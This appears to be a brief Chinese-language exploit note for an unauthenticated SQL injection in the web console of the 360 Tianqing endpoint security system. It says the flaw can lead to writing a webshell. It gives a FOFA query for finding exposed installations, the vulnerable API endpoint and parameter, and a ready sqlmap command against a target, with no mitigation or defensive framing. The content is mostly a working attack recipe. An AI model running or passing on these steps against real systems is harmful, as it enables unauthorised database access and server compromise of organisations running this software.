## 0x00 漏洞背景

        360天擎是一套终端安全管理系统，有客户端和Web端，漏洞出现在Web端，可以未授权访问的API，该API存在SQL注入漏洞，可导致直接写入Webshell
        
        FOFA语句 app="360天擎终端安全管理系统"
        
## 0x01 漏洞利用

        /api/dp/rptsvcsyncpoint?ccid=1
        
        
## 0x02 检测结果

        python sqlmap.py -u https://x.x.x.x:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
        
        
        


 ![图片](https://user-images.githubusercontent.com/118274389/229656369-c2b5d26e-88a7-449e-b0e2-1029cdaafbf5.png)


